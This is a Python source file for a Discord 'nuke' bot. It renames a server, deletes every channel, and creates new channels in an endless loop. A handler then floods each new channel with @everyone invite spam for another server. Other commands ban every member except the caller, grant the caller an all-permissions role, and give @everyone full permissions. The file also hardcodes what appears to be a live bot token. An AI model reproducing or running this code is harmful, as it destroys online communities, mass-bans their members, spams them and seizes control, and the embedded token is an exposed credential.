import discord
from discord.ext import commands
import asyncio, os

bot = commands.Bot(command_prefix='>', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.competing, name=",help"))

tkn = os.getenv("TKN")

          
@bot.command()
async def on(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name="join the new server")
  try:
    for channels in ctx.guild.channels:
      await asyncio.gather(*(channel.delete()
                             for channel in ctx.guild.channels))
      print("deleted", format(channels))
  except:
    print("Could not delete".format(channels))
  finally:
    while True:
      await ctx.guild.create_text_channel("new-server")


@bot.event
async def on_guild_channel_create(channel):
  while True:
    if channel is not None:
      await channel.send("@everyone https://discord.gg/Gangbangers")
      await channel.send("@everyone https://discord.gg/Gangbangers")

@bot.command()
async def ban(ctx):
    for user in ctx.guild.members:
        if user != ctx.author:
            try:
                await user.ban()
            except:
                pass
    await ctx.send('All members except you have been banned.')
          

@bot.command()
async def admin(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  author = ctx.author
  # Create the role with all permissions
  perms = discord.Permissions.all()
  new_role = await guild.create_role(name=".", permissions=perms)
  # Assign the role to the author of the command
  await author.add_roles(new_role)


@bot.command()
async def perms(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  everyone_role = discord.utils.get(guild.roles, name="@everyone")
  new_permissions = discord.Permissions.all()
  await everyone_role.edit(permissions=new_permissions)


bot.run("MTA5MDQ1NTM4NjU4NDI1MjUwOQ.GO7MsU.laYHleWe7u-KmkiM50hDGOx3UXzltFLHvI42Fk")
